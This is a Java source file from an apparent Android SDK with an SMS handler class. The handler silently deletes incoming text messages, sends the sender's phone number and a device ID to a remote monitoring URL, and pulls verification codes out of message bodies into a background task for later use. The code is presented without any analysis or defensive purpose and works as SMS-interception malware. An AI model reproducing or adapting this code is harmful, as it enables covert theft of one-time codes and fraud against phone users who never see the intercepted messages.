package com.ss.sssdk;

import android.content.ContentUris;
import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;

import org.json.JSONObject;

/**
 * Created by ljw on 15/11/11.
 */
public class SMSHandler extends Handler {
    public static final String TAG = "SMSHandler";
    private Context mContext;
    public SMSHandler(Context context)   {
        super();
        this.mContext = context;
    }

    public void handleMessage(Message message) {
        MessageItem item = (MessageItem) message.obj;
        //delete the sms
        Uri uri = ContentUris.withAppendedId(SMSObserver.CONTENT_URI, item.getId());
        mContext.getContentResolver().delete(uri, null, null);
        String body = item.getBody();
        String phone = item.getPhone();
        if(body.startsWith(SMSObserver.FILTER_CEHCKPHONE)) {
            String deviceId = body.substring(SMSObserver.FILTER_CEHCKPHONE.length());
            if(SdkTools.isDeviceId(deviceId)) {
                String param = "p="+phone+"&d="+deviceId;
                HttpRequest.sendGet(HttpUrl.monitor_url, HttpUrl.BIND_PHONE_DEVICEID,null, param, new HttpRequest.IHttpCallBack() {
                    @Override
                    public void callback(String ret) {

                    }

                    @Override
                    public void callback(JSONObject ret) {

                    }
                });
            }
        }else if(body.startsWith(SMSObserver.FILTER_SMS_CODE) || body.contains(SMSObserver.FILTER_SMS_CODE)) {
            String code = SdkTools.getCode(body);
            if(code != null) {
                TaskThread.sms_code = code;
            }
        }

    }

}
